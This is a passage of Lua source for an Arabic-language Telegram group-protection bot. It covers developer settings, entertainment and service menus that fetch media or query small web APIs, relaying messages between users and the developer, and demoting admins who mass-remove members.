for k,idvp in pairs(v.Vips) do
redis:sadd(bot_id..":"..idg..":Status:Vips",idvp)
end
end
end
end
bot.sendText(msg.chat_id,msg.id,"*↯︙تم رفع النسخه بنجاح .*","md")
end
end
if redis:get(bot_id..":set:"..msg.chat_id..":addCh") then
if msg.forward_info then
redis:del(bot_id..":set:"..msg.chat_id..":addCh") 
if msg.forward_info.origin.chat_id then          
id_chat = msg.forward_info.origin.chat_id
else
bot.sendText(msg.chat_id,msg.id,"*↯︙عذرا يجب عليك ارسل توجيه من قناه فقط .*","md")
return false  
end     
sm = bot.getChatMember(id_chat,bot_id)
if sm.status.luatele == "chatMemberStatusAdministrator" then
redis:set(bot_id..":TheCh",id_chat) 
bot.sendText(msg.chat_id,msg.id,"*↯︙تم حفظ القناه بنجاح *","md", true)
else
bot.sendText(msg.chat_id,msg.id,"*↯︙البوت ليس مشرف بالقناه. *","md", true)
end
end
end
if tonumber(text) and redis:get(bot_id..":set:"..msg.chat_id..":dev") then
local UserInfo = bot.getUser(text)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"*↯︙الايدي ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
redis:del(bot_id..":set:"..msg.chat_id..":dev") 
local oldfile = io.open('./sudo.lua',"r"):read('*a')
local oldfile = string.gsub(oldfile,sudoid,text)
local File = io.open('./sudo.lua', "w")
File:write(oldfile)
File:close()
bot.sendText(msg.chat_id,msg.id,"*↯︙تم تغيير المطور الاساسي بنجاح .*","md", true)
dofile("start.lua")
end
if redis:get(bot_id..":set:"..msg.chat_id..":start") then
if msg.content.text then
redis:set(bot_id..":start",text) 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	
}
}
redis:del(bot_id..":set:"..msg.chat_id..":start") 
bot.sendText(msg.chat_id,msg.id,"*↯︙اهلا بك في قائمه الاوامر  .*","md", true, false, false, false, reply_dev)
end
end
if redis:get(bot_id..":set:"..msg.chat_id..":namebot") then
if msg.content.text then
redis:del(bot_id..":set:"..msg.chat_id..":namebot") 
redis:set(bot_id..":namebot",text) 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*↯︙اهلا بك في قائمه الاوامر  .*","md", true, false, false, false, reply_dev)
end
end
if text == "/start" then 
bot.sendText(msg.chat_id,msg.id,"*↯︙اهلا بك في قائمه الاوامر  .*","md", true, false, false, false, bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
})
end 

----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
if text == "/play" or text == "↫  رجوع  ᥀" then
local reply_markup = bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = '↫ اوامر التسليه ᥀',type = 'text'},{text = '↫ الاوامر الخدميه  ᥀', type = 'text'},},
{{text = '↫ اوامر النسب ᥀',type = 'text'},},
{{text = '↫  الحمايه ᥀',type = 'text'},{text = '↫  مطور السورس ᥀',type = 'text'},},
{{text = '↫  السورس ᥀',type = 'text'},},}}
bot.sendText(msg.chat_id,msg.id,'*↯︙اهلا بك في قائمه الاوامر  .*', 'md', false, false, false, false, reply_markup)
end
if text == "↫ اوامر التسليه ᥀" then
local reply_markup = bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = '↫ غنيلي ᥀',type = 'text'},{text = '↫ ميمز ᥀', type = 'text'},},
{{text = '↫ ريمكس ᥀',type = 'text'},{text = '↫ متحركه ᥀', type = 'text'},},
{{text = '↫ صوره ᥀',type = 'text'},{text = '↫ فلم ᥀',type = 'text'},},
{{text = '↫ مسلسل ᥀',type = 'text'},},
{{text = '↫ شعر ᥀',type = 'text'},{text = '↫ انمي ᥀',type = 'text'},},
{{text = '↫  رجوع  ᥀',type = 'text'},},}}
bot.sendText(msg.chat_id,msg.id,'*↯︙اهلا بك في قائمه الاوامر  .*', 'md', false, false, false, false, reply_markup)
end
if text == "↫ الاوامر الخدميه  ᥀" then
local reply_markup = bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = '↫ حساب العمر ᥀',type = 'text'},{text = '↫ معاني الاسماء ᥀', type = 'text'},},
{{text = '↫ الابراج ᥀',type = 'text'},{text = '↫ الزخرفه ᥀', type = 'text'},},
{{text = '↫  نبذتي ᥀',type = 'text'},{text = '↫  اسمي ᥀',type = 'text'},},
{{text = '↫  معرفي ᥀',type = 'text'},{text = '↫ ايديي ᥀',type = 'text'},},
{{text = '↫  رجوع  ᥀',type = 'text'},},}}
bot.sendText(msg.chat_id,msg.id,'*↯︙اهلا بك في قائمه الاوامر  .*', 'md', false, false, false, false, reply_markup)
end
if text == "↫ اوامر النسب ᥀" then
local reply_markup = bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'نسبه الحب',type = 'text'},{text = 'نسبه الكره', type = 'text'},},
{{text = 'نسبه الغباء',type = 'text'},{text = 'نسبه الذكاء', type = 'text'},},
{{text = 'نسبه الرجوله',type = 'text'},{text = 'نسبه الانوثه',type = 'text'},},
{{text = '↫  رجوع  ᥀',type = 'text'},},}}
bot.sendText(msg.chat_id,msg.id,'*↯︙اهلا بك في قائمه الاوامر  .*', 'md', false, false, false, false, reply_markup)
end
if text == "↫ غنيلي ᥀" then
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار الاغنيه لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ' ‹ TeAm MeLaNo  ›',url="t.me/QQOQQD"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/TEAMSUL/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "↫ متحركه ᥀" then
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار متحركه لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ‹ TeAm MeLaNo  ›',url="t.me/QQOQQD"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendanimation?chat_id=' .. msg.chat_id .. '&animation=https://t.me/GifDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "↫ شعر ᥀" then
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار الشعر لك فقط*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ‹ TeAm MeLaNo  ›',url="t.me/QQOQQD"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/L1BBBL/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "↫ مسلسل ᥀" then
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار المسلسل لك فقط*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ‹ TeAm MeLaNo  ›',url="t.me/QQOQQD"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/SeriesWaTaN/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "↫ ميمز ᥀" then
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار الميمز لك فقط*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ‹ TeAm MeLaNo  ›',url="t.me/QQOQQD"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/remixsource/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "↫ ريمكس ᥀" or text == "ريماكس" then 
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار ريمكس لك*'
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = ' ‹ TeAm MeLaNo  ›', url = "https://t.me/QQOQQD"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/remixsource/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "↫ فلم ᥀" then 
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار الفلم لك*'
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = ' ‹ TeAm MeLaNo  ›', url = "https://t.me/QQOQQD"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/MoviesDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "↫ انمي ᥀" then 
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار انمي لك*'
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = ' ‹ TeAm MeLaNo  ›', url = "https://t.me/QQOQQD"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/AnimeDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "↫ صوره ᥀" or text == "صورة" then
Abs = math.random(2,140); 
local Text ='*↯︙تم اختيار صور*'
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = ' ‹ TeAm MeLaNo  ›', url = "https://t.me/QQOQQD"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/PhotosDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ehdjd" then  
send(msg.chat_id,msg.id,'♡︙ من خلال البوت يمكنك معرفه توقعات برجك \n♡︙ فقط قم بارسال امر برج + اسم البرج \n♡︙ مثال : برج الاسد ،\n♡︙ لمعرفه برجك قم بالرجوع الى قسم حساب العمر ','md')
elseif text == "↫ الابراج ᥀" then bot.sendText(msg.chat_id,msg.id,'♡︙ من خلال البوت يمكنك معرفه توقعات برجك \n♡︙ فقط قم بارسال امر برج + اسم البرج \n♡︙ مثال : برج الاسد ،\n♡︙ لمعرفه برجك قم بالرجوع الى قسم حساب العمر','md')
elseif text == "↫  الحمايه ᥀" then bot.sendText(msg.chat_id,msg.id,'♡︙ اضف البوت في المجموعه ثم قم برفعه مشرف وارسل تفعيل \n♡︙ وتمتع بخدمات غير موجوده في باقي البوتات','md')
elseif text == "↫ الزخرفه ᥀" then bot.sendText(msg.chat_id,msg.id,'♡︙قم بأرسال أمر زخرفه وثم ارسال الاسم الذي تريد زخرفته بألانكليزي أو العربي','md')
elseif text == "↫ معاني الاسماء ᥀" then bot.sendText(msg.chat_id,msg.id,'♡︙ من خلال البوت يمكنك معرفه معنى اسمك \n♡︙ فقط قم بارسال امر معنى اسم + الاسم \n♡︙ مثال : معنى اسم ريو','md')
elseif text == "↫ حساب العمر ᥀" then bot.sendText(msg.chat_id,msg.id,'♡︙ من خلال البوت يمكنك حساب عمرك \n♡︙ فقط قم بارسال امر احسب + مواليدك الى البوت \n♡︙ بالتنسيق التالي مثال : احسب 2000/7/24','md')
end
if text == '↫  السورس ᥀' or text == '↫  السورس ᥀' or text == 'قناة السورس' then
photo = "https://t.me/DovePhotoo/5"
local tt =[[
⌔︰[‹ TeAm MeLaNo  › ](https://t.me/GVVVV6) .
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '‹ Source Channel .', url = "https://t.me/GVVVV6"}},
}
local msgg = msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo=https://t.me/GVVVV6&caption=".. URL.escape(tt).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) end
if text == '↫  مطور السورس ᥀' or text == 'مطور السورس' or text == 'المبرمج' then  
local UserId_Info = bot.searchPublicChat("OR_33")
if UserId_Info.id then
local UserInfo = bot.getUser(UserId_Info.id)
local InfoUser = bot.getUserFullInfo(UserId_Info.id)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
local photo = bot.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "  '‹ ‹ TeAm MeLaNo  ›  › \n♡┄┄─┄─┄─┄┄─┄─┄┄♡\n ♡︙*Dev Name* :  ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n♡︙*Dev Bio* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '❲ 𝖼𝗈𝖽𝖾𝗋 ❳', url = "https://t.me/OR_33"}
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  › ', url='https://t.me/QQOQQD'},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
local TestText = "- معلومات مبࢪمج السورس : \\nn: name Dev . ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n\n ["..Bio.."]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '❲ 𝖼𝗈𝖽𝖾𝗋 ❳', url = "https://t.me/OR_33"}
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  › ', url='https://t.me/QQOQQD'},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
end
end
end
if text and text:match("^برج (.*)$") then
local Textbrj = text:match("^برج (.*)$")
gk = io.popen('curl -s "https://apiabs.ml/brg.php?brg='..URL.escape(Textbrj)..'"'):read('*a')
br = JSON.decode(gk)
bot.sendText(msg.chat_id,msg.id, br.ok.abs)
end 
if text and text:match("^معنى اسم (.*)$") then 
local TextMean = text:match("^معنى اسم (.*)$")
UrlMean = io.popen('curl -s "https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)..'"'):read('*a')
Mean = JSON.decode(UrlMean) 
bot.sendText(msg.chat_id,msg.id, Mean.ok.abs)
end  
if text and text:match("^احسب (.*)$") then
local Textage = text:match("^احسب (.*)$")
ge = io.popen('curl -s "https://apiabs.ml/age.php?age='..URL.escape(Textage)..'"'):read('*a')
ag = JSON.decode(ge)
bot.sendText(msg.chat_id,msg.id, ag.ok.abs)
end  
if text == '↫ ايديي ᥀' then
 bot.sendText(msg.chat_id,msg.id,'\nايديك -› '..msg.sender.user_id,"md",true)  
end
if text == "↫  اسمي ᥀"  then
local ban = bot.getUser(msg.sender.user_id)
if ban.first_name then
news = " "..ban.first_name.." "
else
news = " لا يوجد"
end
 bot.sendText(msg.chat_id,msg.id,'\n♡︙اسمك الأول : '..ban.first_name,"md",true)
end
if text == "↫  معرفي ᥀" or text == "يوزري" then
local ban = bot.getUser(msg.sender.user_id)
if ban.username then
banusername = '[@'..ban.username..']'
else
banusername = 'لا يوجد'
end
bot.sendText(msg.chat_id,msg.id,'\n♡︙معرفك هذا : @'..ban.username,"md",true)
end
if text == "/start" and not programmer(msg) then
if redis:get(bot_id..":Notice") then
if not redis:sismember(bot_id..":user_id",msg.sender.user_id) then
scarduser_id = redis:scard(bot_id..":user_id") +1
bot.sendText(sudoid,0,Reply_Status(msg.sender.user_id,"*↯︙قام بدخول الى البوت عدد اعضاء البوت الان ( "..scarduser_id.." ) .*").i,"md",true)
end
end
redis:sadd(bot_id..":user_id",msg.sender.user_id)  
local UserInfo = bot.getUser(sudoid)
if UserInfo.username and UserInfo.username ~= "" then
t = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
ban = ' '..UserInfo.first_name..' '
u = ''..UserInfo.username..''
else
t = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
u = 'OR_33'
end
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ اضفني الى مجموعتك .',url="https://t.me/"..bot.getMe().username.."?startgroup=new"}},
{{text = '↯ ميلانو سورس .',url="t.me/QQOQQD"}},
{{text = '⌔ الـمطور',url="https://t.me/"..(u)..""}},
}
}
if redis:get(bot_id..":start") then
r = redis:get(bot_id..":start")
else
r ="♡︙مرحبا انا بوت  \n♡︙اختصاصي حماية المجموعات\n♡︙من التفليش والفشارام والخخ .. . ،\n♡︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n♡︙سيتم رفع الادمنيه والمنشئ تلقائيا\n♡︙ارسل امر /free او /play للتمتع باوامر الاعضاء"
end
return bot.sendText(msg.chat_id,msg.id,r,"md", true, false, false, false, reply_markup)
end
if not Bot(msg) then
if not programmer(msg) then
if msg.content.text then
if text ~= "/start" then
if redis:get(bot_id..":Twas") then 
if not redis:sismember(bot_id.."banTo",msg.sender.user_id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,'*↯︙تم ارسال رسالتك الى المطور .*').yu,"md",true)  
local FedMsg = bot.sendForwarded(sudoid, 0, msg.chat_id, msg.id)
if FedMsg and FedMsg.content and FedMsg.content.luatele == "messageSticker" then
bot.sendText(IdSudo,0,Reply_Status(msg.sender.user_id,'*↯︙قام بارسال الملصق .*').i,"md",true)  
return false
end
else
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,'*↯︙انت محظور من البوت .*').yu,"md",true)  
end
end
end
end
end
end
if programmer(msg) and msg.reply_to_message_id ~= 0  then    
local Message_Get = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Get.forward_info then
if Message_Get.forward_info.origin.sender_user_id then          
id_user = Message_Get.forward_info.origin.sender_user_id
end    
if text == 'حظر' then
bot.sendText(msg.chat_id,0,Reply_Status(id_user,'*↯︙تم حظره بنجاح .*').i,"md",true)
redis:sadd(bot_id.."banTo",id_user)  
return false  
end 
if text =='الغاء الحظر' then
bot.sendText(msg.chat_id,0,Reply_Status(id_user,'*↯︙تم الغاء حظره بنجاح .*').i,"md",true)
redis:srem(bot_id.."banTo",id_user)  
return false  
end 
if msg.content.video_note then
bot.sendVideoNote(id_user, 0, msg.content.video_note.video.remote.id)
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
bot.sendPhoto(id_user, 0, idPhoto,'')
elseif msg.content.sticker then 
bot.sendSticker(id_user, 0, msg.content.sticker.sticker.remote.id)
elseif msg.content.voice_note then 
bot.sendVoiceNote(id_user, 0, msg.content.voice_note.voice.remote.id, '', 'md')
elseif msg.content.video then 
bot.sendVideo(id_user, 0, msg.content.video.video.remote.id, '', "md")
elseif msg.content.animation then 
bot.sendAnimation(id_user,0, msg.content.animation.animation.remote.id, '', 'md')
elseif msg.content.document then
bot.sendDocument(id_user, 0, msg.content.document.document.remote.id, '', 'md')
elseif msg.content.audio then
bot.sendAudio(id_user, 0, msg.content.audio.audio.remote.id, '', "md") 
elseif msg.content.text then
bot.sendText(id_user,0,text,"md",true)
end 
bot.sendText(msg.chat_id,msg.id,Reply_Status(id_user,'*↯︙تم ارسال رسالتك اليه .*').i,"md",true)  
end
end
end
end
----------------------------------------------------------------------------------------------------
if msg.content.luatele == "messageChatDeleteMember" then 
if msg.sender.user_id ~= bot_id then
Num_Msg_Max = 4
local UserInfo = bot.getUser(msg.sender.user_id)
local names = UserInfo.first_name
local monsha = redis:smembers(bot_id..":"..msg.chat_id..":Status:Creator") 
if redis:ttl(bot_id.."mkal:setex:" .. msg.chat_id .. ":" .. msg.sender.user_id) < 0 then
redis:del(bot_id.."delmembars"..msg.chat_id..msg.sender.user_id)
end
local ttsaa = (redis:get(bot_id.."delmembars"..msg.chat_id..msg.sender.user_id) or 0)
if tonumber(ttsaa) >= tonumber(3) then 
local type = redis:hget(bot_id.."Storm:Spam:Group:User"..msg.chat_id,"Spam:User") 
local removeMembars = https.request("https://api.telegram.org/bot" .. Token .. "/promoteChatMember?chat_id=" .. msg.chat_id .. "&user_id=" ..msg.sender.user_id.."&can_change_info=false&can_manage_chat=false&can_manage_voice_chats=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
local Json_Info = JSON.decode(removeMembars)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor", msg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor", msg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner", msg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator", msg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips", msg.sender.user_id)
if Json_Info.ok == false and Json_Info.error_code == 400 and Json_Info.description == "Bad Request: CHAT_ADMIN_REQUIRED" then
if #monsha ~= 0 then 
local ListMembers = '\n*• تاك للمالكين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(monsha) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local tecxt = ListMembers.."\n•  نداء للمالك [ > Click < ](tg://user?id="..v..")"..
"\n• المشرف ["..names.." ](tg://user?id="..msg.sender.user_id..")"..
"\n• قام بازالة اعضاء من المجموعة \n• لا يمكنني تنزيله من المشرفين"
bot.sendText(msg.chat_id,msg.id,tecxt,"md")
end
end
if Json_Info.ok == false and Json_Info.error_code == 400 and Json_Info.description == "Bad Request: can't remove chat owner" then
if #monsha ~= 0 then 
local ListMembers = '\n*• تاك للمالكين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(monsha) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local tecxt = ListMembers.."\n•  نداء للمالك [ > Click < ](tg://user?id="..v..")"..
"\n• المشرف ["..names.." ](tg://user?id="..msg.sender.user_id..")"..
"\n• قام بطرد اعضاء من المجموعة , ليست لدي صلاحيه اضافه مشرفين لتنزيله"
bot.sendText(msg.chat_id,msg.id,tecxt,"md")
end
end
if Json_Info.ok == true and Json_Info.result == true then
if #monsha ~= 0 then 
local ListMembers = '\n*• تاك للمالكين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(monsha) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local tecxt = ListMembers.."\n•  نداء للمالك [ > Click < ](tg://user?id="..v..")"..
"\n• المشرف ["..names.." ](tg://user?id="..msg.sender.user_id..")"..
"\n• قام بطرد اكثر من 3 اعضاء وتم تنزيله من المشرفين "
bot.sendText(msg.chat_id,msg.id,tecxt,"md")
end
end
redis:del(bot_id.."delmembars"..msg.chat_id..msg.sender.user_id)
end
redis:setex(bot_id.."mkal:setex:" .. msg.chat_id .. ":" .. msg.sender.user_id, 3600, true) 
redis:incrby(bot_id.."delmembars"..msg.chat_id..msg.sender.user_id, 1)  
end
end 

if text and text:match('طرد @(.*)') or text and text:match('حظر @(.*)') or text and text:match('طرد (%d+)') or text and text:match('حظر (%d+)') then 
if msg.sender.user_id ~= bot_id then
Num_Msg_Max = 4
local UserInfo = bot.getUser(msg.sender.user_id)
local names = UserInfo.first_name 
local monsha = redis:smembers(bot_id..":"..msg.chat_id..":Status:Creator")  
if redis:ttl(bot_id.."qmkal:setex:" .. msg.chat_id .. ":" .. msg.sender.user_id) < 0 then
redis:del(bot_id.."qdelmembars"..msg.chat_id..msg.sender.user_id)
end
local ttsaa = (redis:get(bot_id.."qdelmembars"..msg.chat_id..msg.sender.user_id) or 0)
if tonumber(ttsaa) >= tonumber(4) then 
print('spammmmm')
local removeMembars = https.request("https://api.telegram.org/bot" .. Token .. "/promoteChatMember?chat_id=" .. msg.chat_id .. "&user_id=" ..msg.sender.user_id.."&can_change_info=false&can_manage_chat=false&can_manage_voice_chats=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
local Json_Info = JSON.decode(removeMembars)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor", msg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor", msg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner", msg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator", msg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips", msg.sender.user_id)
if Json_Info.ok == false and Json_Info.error_code == 400 and Json_Info.description == "Bad Request: CHAT_ADMIN_REQUIRED" then
if #monsha ~= 0 then 
local ListMembers = '\n*• تاك للمالكين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(monsha) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local tecxt = ListMembers.."\n• المشرف ["..names.." ](tg://user?id="..msg.sender.user_id..")"..
"\n• قام بالتكرار في ازاله الاعضاء \n• لا يمكنني تنزيله من المشرفين"
bot.sendText(msg.chat_id,msg.id,tecxt,"md")
end
end
if Json_Info.ok == false and Json_Info.error_code == 400 and Json_Info.description == "Bad Request: can't remove chat owner" then
if #monsha ~= 0 then 
local ListMembers = '\n*• تاك للمالكين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(monsha) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local tecxt = ListMembers.."\n• المشرف ["..names.." ](tg://user?id="..msg.sender.user_id..")"..
"\n• هناك عمليه تخريب وطرد الاعضاء , ليست لدي صلاحيه اضافه مشرفين لتنزيله"
bot.sendText(msg.chat_id,msg.id,tecxt,"md")
end
end
if Json_Info.ok == true and Json_Info.result == true then
if #monsha ~= 0 then 
local ListMembers = '\n*• تاك للمالكين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(monsha) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local tecxt = ListMembers.."\n• المشرف ["..names.." ](tg://user?id="..msg.sender.user_id..")"..
"\n• هناك عمليه تخريب وطرد الاعضاء , ليست لدي صلاحيه اضافه مشرفين لتنزيله"
bot.sendText(msg.chat_id,msg.id,tecxt,"md")
end
end
redis:del(bot_id.."qdelmembars"..msg.chat_id..msg.sender.user_id)
end
redis:setex(bot_id.."qmkal:setex:" .. msg.chat_id .. ":" .. msg.sender.user_id, 3600, true) 
redis:incrby(bot_id.."qdelmembars"..msg.chat_id..msg.sender.user_id, 1)  
end
end 

if bot.getChatId(msg.chat_id).type == "supergroup" then 
